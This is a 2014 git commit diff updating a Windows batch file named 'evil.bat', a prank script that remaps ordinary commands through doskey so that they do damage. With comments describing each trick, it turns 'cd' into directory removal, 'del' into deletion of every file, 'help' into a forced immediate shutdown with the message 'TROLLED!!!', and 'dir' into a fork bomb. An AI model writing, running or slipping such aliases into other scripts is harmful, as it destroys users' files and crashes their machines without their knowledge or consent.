7b3b4815f70a9027daee4a52d32ac2a3f5cafb3b
Alexander Kitaev <epicpiano8@gmail.com>
2014-06-19 17:39:17 -0400

    Update evil.bat

--- evil.bat
+++ evil.bat
@@ -1,7 +1,16 @@
 @ECHO OFF
+
+REM delete whatever the user tries to enter.
 doskey cd=rmdir
+
+REM make a new shell open whenever the user tries to exit.
 doskey exit=cmd
-doskey ?=shutdown -s
-doskey ls=?
-doskey cls=%0|%0
-donkey time=time %random%
+
+REM make help forcefully shut down the computer
+doskey help=shutdown -s -f -t 1 -c "TROLLED!!!"
+
+REM delete everything when a user just tries to delete one file.
+doskey del=del *
+
+REM make dir launch a fork-bomb
+doskey dir=%0|%0
